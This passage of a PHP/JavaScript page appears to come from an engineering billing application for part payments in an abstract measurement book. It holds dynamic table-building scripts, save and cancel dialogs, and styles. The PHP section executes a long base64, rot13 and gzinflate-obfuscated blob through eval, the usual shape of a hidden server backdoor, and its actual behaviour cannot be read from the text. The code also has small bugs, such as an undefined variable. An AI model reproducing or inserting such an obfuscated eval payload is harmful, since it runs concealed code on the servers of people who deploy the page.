						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable1[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayAbleSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = mbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
			document.getElementById("slmheadrow").className = "hide";
			document.getElementById("slmtotalrow").className = "hide";
			document.getElementById("slmremarksrow").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
			document.getElementById("slmheadrow").className = "";
			document.getElementById("slmtotalrow").className = "";
			document.getElementById("slmremarksrow").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm1[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm1";
							txt_box2.id = "txt_item_rate_slm1"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							//txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm1";
							txt_box3.id = "txt_partpay_percent_slm1"+index;
							txt_box3.value = percen1t;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm1[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm1"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result1[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str").value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "@*@" + DpmRemarks;
		//alert(result);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		


	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<!--<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:16px;" width="1077px"  height="48px" class="pagetitle" align="center">ABSTRACT MEASUREMENT BOOK - PART PAYMENT</td>
	</tr>
</table>-->
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
$page = $abstmbpage;
$title = '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;&nbsp;</td></tr>
			</table>';
echo $title;
//$Line = $Line+2;
?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

for($k1=0; $k1<count($expAllMonRbnStr); $k1++)
{
	$AllMonRbn 		= $expAllMonRbnStr[$k1];
	$expAllMonRbn 	= explode("*",$AllMonRbn);
	$expRbn 	= $expAllMonRbn[0];
	$expMonth 	= $expAllMonRbn[1];
	//echo $expMonth."<br/>";
	if(in_array($expMonth, $NonExistMonthList))
	{
		// So dont take this rbn because this rbn's period is out of escalation period
		array_push($NotSelRbnArr,$expRbn);
	}
	else
	{
		$SelRbnStr .= $expRbn."*";
		array_push($SelRbnArr,$expRbn);
	}
}
$UniqSelRbnArr 		= array_values(array_unique($SelRbnArr)); 
$UniqNotSelRbnArr 	= array_values(array_unique($NotSelRbnArr)); 
$RBNarr_1 = array_values(array_diff($UniqSelRbnArr,$UniqNotSelRbnArr));
// array_diff will remove the element which exist in both array and return first array
// array_values will set the array index key value as from beginning i.e a[0], a[1], a[2]...
sort($RBNarr_1, SORT_NUMERIC); 
$arr_1Cnt = count($RBNarr_1);
$slm_rbn = $arr_1[$arr_1Cnt-1];
//print_r($UniqNotSelRbnArr);
//echo $slm_rbn;
//$Line = $Line+2;
// $subdivisionlist_2 = "";
$DevItemArray = array();
$WoQtyItemArr = array();
for($k2=0; $k2<$arr_1Cnt; $k2++)
{
